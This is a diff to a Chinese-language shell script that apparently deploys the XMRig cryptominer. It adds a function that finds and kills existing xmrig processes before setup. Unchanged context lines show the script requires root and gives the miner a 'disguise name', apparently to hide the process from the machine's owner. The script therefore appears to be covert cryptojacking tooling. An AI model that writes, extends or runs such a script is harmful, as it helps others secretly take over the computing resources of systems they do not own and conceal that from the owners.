@@ -697,6 +697,53 @@ start_mining() {
     log_info "挖矿服务已启动"
 }
 
+# 检查并终止现有的xmrig进程
+kill_existing_xmrig() {
+    log_info "检查现有的xmrig进程..."
+    
+    # 查找所有可能的xmrig进程（包括原名和伪装名）
+    local xmrig_pids=$(pgrep -f "xmrig" 2>/dev/null || true)
+    local xmrig_exact_pids=$(pgrep -x "xmrig" 2>/dev/null || true)
+    
+    # 合并所有找到的PID并去重
+    local all_pids=$(echo "$xmrig_pids $xmrig_exact_pids" | tr ' ' '\n' | sort -u | grep -v '^$' || true)
+    
+    if [ -n "$all_pids" ]; then
+        log_info "发现现有的xmrig进程，正在终止..."
+        for pid in $all_pids; do
+            if [ -n "$pid" ] && [ "$pid" -gt 0 ] 2>/dev/null; then
+                log_info "终止进程 PID: $pid"
+                kill -TERM "$pid" 2>/dev/null || true
+                sleep 1
+                
+                # 如果进程仍然存在，强制终止
+                if kill -0 "$pid" 2>/dev/null; then
+                    log_info "强制终止进程 PID: $pid"
+                    kill -KILL "$pid" 2>/dev/null || true
+                fi
+            fi
+        done
+        
+        # 等待进程完全终止
+        sleep 2
+        
+        # 再次检查是否还有残留进程
+        local remaining_pids=$(pgrep -f "xmrig" 2>/dev/null || true)
+        if [ -n "$remaining_pids" ]; then
+            log_warning "仍有xmrig进程运行，尝试强制清理..."
+            for pid in $remaining_pids; do
+                if [ -n "$pid" ] && [ "$pid" -gt 0 ] 2>/dev/null; then
+                    kill -KILL "$pid" 2>/dev/null || true
+                fi
+            done
+        fi
+        
+        log_info "现有xmrig进程已清理完成"
+    else
+        log_info "未发现现有的xmrig进程"
+    fi
+}
+
 # 显示状态信息
 show_status() {
     echo
@@ -734,6 +781,9 @@ main() {
         log_error "请使用root权限运行此脚本"
         exit 1
     fi
+    
+    # 检查并终止现有的xmrig进程
+    kill_existing_xmrig
     
     # 获取伪装名称
     DISGUISE_NAME=$(get_disguise_name)
